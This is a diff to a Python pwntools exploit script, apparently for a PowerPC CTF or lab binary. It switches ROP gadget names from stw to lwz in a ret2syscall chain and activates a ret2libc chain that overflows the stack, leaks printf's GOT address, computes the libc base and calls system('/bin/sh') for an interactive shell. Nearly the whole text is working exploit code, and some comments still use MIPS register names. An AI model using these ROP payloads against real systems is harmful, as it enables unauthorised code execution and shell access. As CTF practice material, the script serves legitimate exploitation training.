@@ -36,14 +36,14 @@ def ret2text():
 
 def ret2syscall():
     bin_sh = 0x10000940
-    stw_3_4_5_lr_blr = 0x100005D8
-    stw_0_9_b9 = 0x100005F4
+    lwz_3_4_5_lr_blr = 0x100005D8
+    lwz_0_9_b9 = 0x100005F4
     sc = 0x10000608
     payload = flat([cyclic(0x28), 
-                p32(stw_3_4_5_lr_blr), # 2 pad
-                p32(0), p32(stw_3_4_5_lr_blr), 
+                p32(lwz_3_4_5_lr_blr), # 2 pad
+                p32(0), p32(lwz_3_4_5_lr_blr), 
                 p32(bin_sh), p32(0), p32(0),
-                p32(stw_0_9_b9), 
+                p32(lwz_0_9_b9), 
                 p32(11), p32(sc)])
   
     if debug_flag: pause()
@@ -51,44 +51,47 @@ def ret2syscall():
     if debug_flag: pause()
     ru("\n")
 
-# def ret2libc():
-#     printf_plt = elf.plt['printf']
-#     printf_got = elf.got['printf']
-#     start_addr = elf.sym['_start']
-#     lw_a0_a1_a2_ra_ret = 0x10620
-#     lw_t0_ra_jr_t0 = 0x10650
-#     payload_1 = flat([
-#         cyclic(0x20),
-#         p32(lw_a0_a1_a2_ra_ret),
-#         p32(printf_got),
-#         p32(0),           # a0
-#         p32(0),           # a1
-#         p32(lw_t0_ra_jr_t0),
-#         p32(printf_plt),  # t0
-#         p32(start_addr)   # ra Return to _start
-#     ])
-#     if debug_flag: pause()
-#     sa("Enter a string: ", payload_1)
-#     ru("\n")
-#     printf_addr = u32(r(4))
-#     libc.address = printf_addr - libc.sym['printf']
-#     log.success(f"printf address: {hex(printf_addr)}")
-#     log.success(f"libc base address: {hex(libc.address)}")
-#     log.success(f"system address: {hex(libc.sym['system'])}")
-#     log.success(f"/bin/sh address: {hex(next(libc.search(b'/bin/sh\x00')))}")
-#     if debug_flag: pause()
-#     payload_2 = flat([
-#         cyclic(0x20),
-#         p32(lw_a0_a1_a2_ra_ret),
-#         p32(next(libc.search(b'/bin/sh\x00'))),  # a0
-#         p32(0),
-#         p32(0),
-#         p32(libc.sym['system']),  # ra
-#     ])
-#     sa("Enter a string: ", payload_2)
-#     if debug_flag: pause()
-#     ru("\n")
+def ret2libc():
+    printf_plt = 0x10000850
+    printf_got = 0x1001FFE8
+    start_addr = 0x100007E8
+    lwz_3_4_5_lr_blr = 0x100005D8
+    lwz_0_9_b9 = 0x100005F4
+    lwz_13_lr_b13 = 0x1000060C
+    payload_1 = flat([
+        cyclic(0x28),
+        p32(lwz_3_4_5_lr_blr),
+        p32(0), p32(lwz_3_4_5_lr_blr),
+        p32(printf_got),
+        p32(0),           # a0
+        p32(0),           # a1
+        p32(lwz_13_lr_b13),
+        p32(printf_plt),  # t0
+        p32(start_addr)   # ra Return to _start
+    ])
+    if debug_flag: pause()
+    sa("Enter a string: ", payload_1)
+    ru("\n")
+    printf_addr = u32(r(4))
+    libc.address = printf_addr - libc.sym['printf']
+    log.success(f"printf address: {hex(printf_addr)}")
+    log.success(f"libc base address: {hex(libc.address)}")
+    log.success(f"system address: {hex(libc.sym['system'])}")
+    log.success(f"/bin/sh address: {hex(next(libc.search(b'/bin/sh\x00')))}")
+    if debug_flag: pause()
+    payload_2 = flat([
+        cyclic(0x28),
+        p32(lwz_3_4_5_lr_blr),
+        p32(0), p32(lwz_3_4_5_lr_blr), 
+        p32(next(libc.search(b'/bin/sh\x00'))),  # a0
+        p32(0),
+        p32(0),
+        p32(libc.sym['system']),  # ra
+    ])
+    sa("Enter a string: ", payload_2)
+    if debug_flag: pause()
+    ru("\n")
 
 if __name__ == "__main__":
-    ret2syscall()
+    ret2libc()
     gift.io.interactive()
